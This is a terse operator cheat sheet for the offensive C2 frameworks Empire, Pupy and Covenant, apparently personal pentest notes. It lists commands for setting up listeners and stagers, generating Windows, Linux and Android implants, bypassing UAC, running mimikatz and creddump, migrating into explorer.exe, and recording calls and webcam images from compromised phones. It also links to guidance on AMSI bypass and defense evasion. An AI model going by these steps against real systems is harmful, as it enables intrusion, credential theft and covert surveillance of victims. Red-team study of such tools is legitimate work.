##Empire

	- ./empire
	- > preobfuscate
	- > set Obfuscate true
	- > listeners
	- > uselistener http
	- > info
	- > set Name / set Host
	- > execute
	- > usestager <tab>
	- > usestager osx/launcher
	- > set listener 
	- > execute
	- > agents
	- > rename
	- > interact
	- > bypassuac http
	- > info
	- > mimikatz
	- > creds
	- > shell netstat -ano
	- > dowload/upload
	- > usemodule <tab> privesc/bypassuac
	- > set <" ">
	- > execute
	- > 




##Pupy

	- ./pupysh.py
	- ./pupygen.py -h
	- ./pupygen.py -O windows -A x86 -o /root/Desktop/shell.exe
	- >> sessions
	- >> rdesktop -h
	- >> bypassuac -h
	- >> creddump
	- >> ps
	- >> migrate -p explorer.exe -k

	- ./pupygen.py -O linux -A x64 -o /root/Desktop.shell
	- >> privesc_checker --linenum
	- >> exploit_suggester -h
	- >> get_info

	- ./pupygen.py -O android -o /root/shell.apk
	- >> call -a -output-folder /root/call
	- >> webcamsnap -v
	- >> apps -a -d

##Covenant



- [Bypass AMSI Manual](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/)

- [Manipulación para evasión defensa](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/)
